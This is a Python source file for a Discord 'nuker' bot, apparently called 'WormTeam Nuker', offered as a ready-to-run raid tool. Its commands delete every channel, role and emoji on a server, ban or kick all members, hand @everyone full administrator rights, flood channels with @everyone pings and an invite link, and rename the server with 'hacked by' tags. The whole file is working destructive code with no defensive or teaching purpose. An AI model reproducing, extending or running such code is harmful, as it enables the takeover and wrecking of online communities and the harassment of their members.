import discord
from discord.ext import commands
import asyncio
import os

# Logo
print("""
█████╗  ██████╗  ██╗
██╔══██╗██╔═████╗███║
╚██████║██║██╔██║╚██║
╚═══██║████╔╝██║ ██║
█████╔╝╚██████╔╝ ██║
╚════╝  ╚═════╝  ╚═╝
""")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'✅ Connected as {bot.user}')
    print(f'👤 {bot.user.name}')
    print(f'📊 {len(bot.guilds)} servers')
    
    print("\n╔══════════════════════════════════════════════╗")
    print("║              ⚡ COMMANDS                     ║")
    print("╠══════════════════════════════════════════════╣")
    print("║  [1]  Create Channels                       ║")
    print("║  [2]  Delete Channels                       ║")
    print("║  [3]  Delete Roles                          ║")
    print("║  [4]  Ban All                               ║")
    print("║  [5]  Kick All                              ║")
    print("║  [6]  Spam All Channels                     ║")
    print("║  [7]  Change Server Name                    ║")
    print("║  [8]  Give @everyone Admin                  ║")
    print("║  [9]  Help                                  ║")
    print("╚══════════════════════════════════════════════╝")
    print("\n👨‍💻 Developer: 3zF")
    print("✅ Bot Ready\n")

@bot.command(name='1')
async def create_channels(ctx):
    await ctx.message.delete()
    
    def check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)
    
    try:
        await ctx.author.send("📛 **Enter channel name:**")
        name_msg = await bot.wait_for('message', timeout=30, check=check)
        name = name_msg.content
        
        await ctx.author.send("🔢 **Enter number of channels:**")
        count_msg = await bot.wait_for('message', timeout=30, check=check)
        count = int(count_msg.content)
        
        await ctx.author.send("📨 **Enter spam message (or 'none' for no spam):**")
        spam_msg = await bot.wait_for('message', timeout=30, check=check)
        spam = spam_msg.content
        
        created = 0
        for i in range(count):
            try:
                channel = await ctx.guild.create_text_channel(f"{name}{i+1}")
                print(f"✅ Created: {channel.name}")
                created += 1
                
                if spam.lower() != 'none':
                    for j in range(50):
                        try:
                            await channel.send(spam)
                        except:
                            pass
                    print(f"💬 Spammed: {channel.name}")
            except Exception as e:
                print(f"❌ Failed: {e}")
            
        await ctx.author.send(f"✅ **Done! Created {created} channels: {name}**")
    except:
        await ctx.author.send("❌ **Timed out or error**")

@bot.command(name='2')
async def delete_channels(ctx):
    await ctx.message.delete()
    count = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            count += 1
            print(f"🗑️ Deleted: {channel.name} ({count})")
        except:
            pass
    await ctx.send(f"🗑️ **Deleted {count} channels**")

@bot.command(name='3')
async def delete_roles(ctx):
    await ctx.message.delete()
    count = 0
    for role in ctx.guild.roles:
        if role.name != '@everyone':
            try:
                await role.delete()
                count += 1
                print(f"🗑️ Deleted: {role.name} ({count})")
            except:
                pass
    await ctx.send(f"🗑️ **Deleted {count} roles**")

@bot.command(name='4')
async def ban_all(ctx):
    await ctx.message.delete()
    
    def check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)
    
    try:
        await ctx.author.send("⚠️ **Confirm ban all? (yes/no)**")
        confirm = await bot.wait_for('message', timeout=30, check=check)
        
        if confirm.content.lower() != 'yes':
            await ctx.author.send("❌ Cancelled")
            return
            
        count = 0
        for member in ctx.guild.members:
            if member != ctx.guild.me and not member.bot:
                try:
                    await member.ban()
                    count += 1
                    print(f"🔨 Banned: {member.name} ({count})")
                except:
                    pass
        await ctx.send(f"🔨 **Banned {count} members**")
    except:
        await ctx.author.send("❌ **Timed out**")

@bot.command(name='5')
async def kick_all(ctx):
    await ctx.message.delete()
    
    def check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)
    
    try:
        await ctx.author.send("⚠️ **Confirm kick all? (yes/no)**")
        confirm = await bot.wait_for('message', timeout=30, check=check)
        
        if confirm.content.lower() != 'yes':
            await ctx.author.send("❌ Cancelled")
            return
            
        count = 0
        for member in ctx.guild.members:
            if member != ctx.guild.me and not member.bot:
                try:
                    await member.kick()
                    count += 1
                    print(f"👢 Kicked: {member.name} ({count})")
                except:
                    pass
        await ctx.send(f"👢 **Kicked {count} members**")
    except:
        await ctx.author.send("❌ **Timed out**")

@bot.command(name='6')
async def spam_channels(ctx):
    await ctx.message.delete()
    
    def check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)
    
    try:
        await ctx.author.send("📨 **Enter spam message:**")
        spam_msg = await bot.wait_for('message', timeout=30, check=check)
        message = spam_msg.content
        
        count = 0
        for channel in ctx.guild.channels:
            try:
                for i in range(50):
                    try:
                        await channel.send(message)
                    except:
                        pass
                count += 1
                print(f"💬 Spammed: {channel.name}")
            except:
                pass
            
        await ctx.author.send(f"✅ **Spammed {count} channels**")
    except:
        await ctx.author.send("❌ **Timed out**")

@bot.command(name='7')
async def change_name(ctx):
    await ctx.message.delete()
    
    def check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)
    
    try:
        await ctx.author.send("📝 **Enter new server name:**")
        name_msg = await bot.wait_for('message', timeout=30, check=check)
        new_name = name_msg.content
        
        await ctx.guild.edit(name=new_name)
        print(f"📝 Name changed: {new_name}")
        await ctx.send(f"📝 **Server name: {new_name}**")
    except:
        await ctx.author.send("❌ **Timed out**")

@bot.command(name='8')
async def give_admin(ctx):
    await ctx.message.delete()
    
    def check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)
    
    try:
        await ctx.author.send("⚠️ **Give @everyone Admin? (yes/no)**")
        confirm = await bot.wait_for('message', timeout=30, check=check)
        
        if confirm.content.lower() != 'yes':
            await ctx.author.send("❌ Cancelled")
            return
            
        role = ctx.guild.default_role
        await role.edit(permissions=discord.Permissions.all())
        print("👑 Admin given")
        await ctx.send("👑 **@everyone now has Admin!**")
    except:
        await ctx.author.send("❌ **Timed out**")

@bot.command(name='9')
async def help_command(ctx):
    help_text = """
╔══════════════════════════════════════╗
║        ⚡ COMMANDS                  ║
╠══════════════════════════════════════╣
║  [1]  Create Channels               ║
║  [2]  Delete Channels               ║
║  [3]  Delete Roles                  ║
║  [4]  Ban All                       ║
║  [5]  Kick All                      ║
║  [6]  Spam All Channels             ║
║  [7]  Change Server Name            ║
║  [8]  Give @everyone Admin          ║
║  [9]  Help                          ║
╚══════════════════════════════════════╝
    """
    embed = discord.Embed(
        title="🔥 WormTeam Nuker",
        description=help_text,
        color=0x8B0000
    )
    embed.set_footer(text="Developer: 3zF")
    await ctx.send(embed=embed)

# Original commands from your code
@bot.command()
async def ban(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member.id != 504281479250051074:
            try:
                await member.ban()
                print(f"{member.name} was banned")
            except:
                pass

@bot.command()
async def admin(ctx):
    await ctx.message.delete()
    try:
        role = ctx.guild.default_role
        await role.edit(permissions=discord.Permissions.all())
        print("@everyone now has admin")
    except:
        pass

@bot.command()
async def roles(ctx):
    await ctx.message.delete()
    for i in range(250):
        try:
            await ctx.guild.create_role(name="hacked by GRoup Sh6R")
            print(f"Role created {i+1}")
        except:
            pass

@bot.command()
async def Sh6R(ctx):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(name="hacked by GRoupSh6R")
    except:
        pass
    
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{channel.name} deleted")
        except:
            pass
    
    for i in range(50):
        try:
            channel = await ctx.guild.create_text_channel("hacker-by-GRoupSh6R")
            for j in range(100):
                try:
                    await channel.send("@everyone @here https://discord.gg/whZQG97vj")
                except:
                    pass
            print(f"{channel.name} created and spammed")
        except:
            pass

@bot.command()
async def kick(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick()
            print(f"{member.name} was kicked")
        except:
            pass

@bot.command()
async def emojidel(ctx):
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            print(f"{emoji.name} deleted")
        except:
            pass

@bot.command()
async def name(ctx):
    await ctx.message.delete()
    new_name = ' '.join(ctx.message.content.split()[1:])
    if new_name:
        try:
            await ctx.guild.edit(name=new_name)
            print(f"Server name changed: {new_name}")
        except:
            pass

@bot.command()
async def prune(ctx):
    await ctx.send("Initiating prune request.")
    try:
        pruned = await ctx.guild.prune_members(days=1)
        await ctx.send(f"Successfully pruned {pruned} members!")
    except:
        await ctx.send("Pruning failed.")

# Run bot
token = input("🔑 Enter bot token: ")
bot.run(token)
